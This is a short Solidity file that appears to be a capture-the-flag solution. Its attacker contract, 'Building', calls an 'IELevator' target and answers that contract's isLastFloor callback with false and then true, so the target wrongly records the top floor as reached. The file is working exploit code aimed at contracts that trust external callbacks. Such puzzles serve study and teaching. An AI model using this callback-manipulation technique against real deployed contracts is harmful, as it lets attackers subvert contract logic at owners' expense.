//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

interface IELevator {
    function goTo(uint _floors) external;

}

contract Building {
    address public owner;
    IELevator targetContract;
    event LastFloor(bytes32 message);
    bool public switchFlipped =  false;


    constructor(address _targetAddr) public {
        targetContract = IELevator(_targetAddr);
        owner = msg.sender;
    }

    function hackelevator() public {
        targetContract.goTo(10);
    }

    function isLastFloor(uint) public returns (bool){
        emit LastFloor("Running isLastFloor");
         if (! switchFlipped) {
             switchFlipped = true;
            return false;
         } else {
             switchFlipped = false;
             return true;
        }
    }
}
